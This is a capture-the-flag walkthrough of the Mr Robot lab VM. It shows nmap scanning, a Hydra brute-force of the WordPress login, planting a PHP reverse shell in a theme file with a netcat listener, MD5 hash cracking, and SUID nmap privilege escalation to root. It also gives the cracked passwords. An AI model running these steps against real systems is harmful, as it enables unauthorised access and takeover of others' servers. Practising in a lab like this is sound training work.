# Mr Robot CTF Walkthrough

Step 1: Setting Up the Lab
1. Downloaded & Imported the VM

    I got the .ova file from VulnHub.

    Imported it into VirtualBox (File → Import Appliance).

    Started the VM—it booted into a weird initramfs screen (looked like a Linux recovery shell).

2. Found the Machine’s IP

Since I didn’t know the IP, I ran this from my Kali Linux:

    sudo netdiscover -r 192.168.1.0/24

(I replaced 192.168.1.0/24 with my actual network range.)

Found it! → 192.168.1.105

Step 2: Exploring the Website
1. Basic Nmap Scan

I ran:

    nmap -sV -A -T4 192.168.1.105

Results:

    Port 80 (HTTP): Apache web server.

    Port 443 (HTTPS): Also Apache.

    SSH (Port 22): Closed.

2. Checked the Webpage

I opened http://192.168.1.105 and saw a Mr. Robot-themed site.
3. Looked at robots.txt

I visited http://192.168.1.105/robots.txt and found:

User-agent: *
Disallow: /fsocity.dic  
Disallow: /key-1-of-3.txt  

Jackpot!

    Downloaded key-1-of-3.txt → First flag! 🚩

    Downloaded fsocity.dic → Looked like a password wordlist.

Step 3: Hacking WordPress
1. Found the WordPress Login Page

I saw /wp-login.php and tried default credentials (admin:admin)—no luck.
2. Cracked the Password

Since I had fsocity.dic, I used Hydra to brute-force:

    hydra -l elliot -P fsocity.dic 192.168.1.105 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username" -V

After a few minutes, I got:
[80][http-post-form] host: 192.168.1.105 login: elliot password: ER28-0652
3. Logged In & Uploaded a Shell

    Went to Appearance → Theme Editor.

    Replaced 404.php with a PHP reverse shell (from PentestMonkey).

    Started a listener:    

    nc -lvnp 4444

    Visited http://192.168.1.105/wp-content/themes/twentyfifteen/404.php → Got a shell!

 Step 4: Privilege Escalation
1. Stabilized the Shell

The shell was unstable, so I upgraded it:

    python -c 'import pty; pty.spawn("/bin/bash")'

2. Found the Second Flag

I checked /home/robot:

    cd /home/robot
    ls -la

    key-2-of-3.txt → Couldn’t read it (permission denied).

    password.raw-md5 → Contained a hash!

Cracked the hash with John:

    john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt password.raw-md5

Got the password: abcdefghijklmnopqrstuvwxyz (So much efforts for this )

Switched to robot user:

    su robot

Read the second flag! 
3. Became Root

I checked for SUID binaries:

    find / -perm -4000 2>/dev/null

Found /usr/local/bin/nmap with SUID!

Escalated to root using nmap interactive mode:

    nmap --interactive
    !sh

Root access done

Grabbed the final flag:


    cat /root/key-3-of-3.txt

 Conclusion

 Flag 1: /key-1-of-3.txt (easy find in robots.txt).
 Flag 2: /home/robot/key-2-of-3.txt (cracked the hash).
 Flag 3: /root/key-3-of-3.txt (SUID escalation).
